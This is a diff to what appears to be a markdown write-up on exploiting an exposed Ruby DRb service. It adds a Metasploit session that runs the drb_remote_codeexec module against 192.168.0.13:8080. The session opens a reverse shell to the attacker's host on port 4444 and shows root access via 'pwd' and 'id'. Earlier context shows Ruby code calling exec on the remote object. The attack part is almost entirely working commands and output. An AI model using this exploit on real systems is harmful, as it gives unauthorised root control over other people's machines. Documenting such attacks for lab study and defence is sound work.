@@ -44,3 +44,31 @@ DRb.thread.join
 rshell = DRbObject.new_with_uri("druby://192.168.0.13:8080")
 puts rshell.exec "id"
 ```
+
+Or you can use metasploit module to get an elegant shell! 
+
+```bash
+msf > use exploit/linux/misc/drb_remote_codeexec 
+msf exploit(drb_remote_codeexec) > set uri druby://192.168.0.13:8080
+uri => druby://192.168.0.13:8080
+msf exploit(drb_remote_codeexec) > exploit 
+
+[*] Started reverse double handler
+[*] trying to exploit instance_eval
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo UAR3ld0Uqnc03yNy;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket A
+[*] A: "UAR3ld0Uqnc03yNy\r\n"
+[*] Matching...
+[*] B is input...
+[*] Command shell session 2 opened (192.168.0.18:4444 -> 192.168.0.13:57811) at 2015-12-24 01:11:30 +0300
+
+pwd
+/root
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
